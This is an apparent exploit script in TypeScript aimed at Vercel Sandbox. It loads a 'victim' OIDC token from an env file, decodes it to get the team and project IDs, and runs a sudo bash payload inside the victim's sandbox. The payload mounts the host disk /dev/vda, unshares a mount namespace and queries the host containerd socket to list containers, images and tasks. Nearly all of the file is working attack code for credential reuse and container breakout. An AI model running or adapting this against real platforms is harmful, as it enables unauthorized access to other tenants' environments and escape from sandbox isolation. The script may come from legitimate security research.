import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
grpc_list() {
  local path=$1
  echo "===== $path ====="
  timeout 8 curl -s --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock \
    -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \
    --data-binary @/tmp/empty.msg \
    -D - -o /tmp/grpc.out "http://unix$path" 2>&1 | head -20
  echo "--- body (first 200 bytes) ---"
  head -c 200 /tmp/grpc.out | od -c | head -12
}
grpc_list /containerd.services.namespaces.v1.Namespaces/List
grpc_list /containerd.services.containers.v1.Containers/List
grpc_list /containerd.services.images.v1.Images/List
grpc_list /containerd.services.tasks.v1.Tasks/List
grpc_list /containerd.services.introspection.v1.Introspection/Plugins
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore11.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore11.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });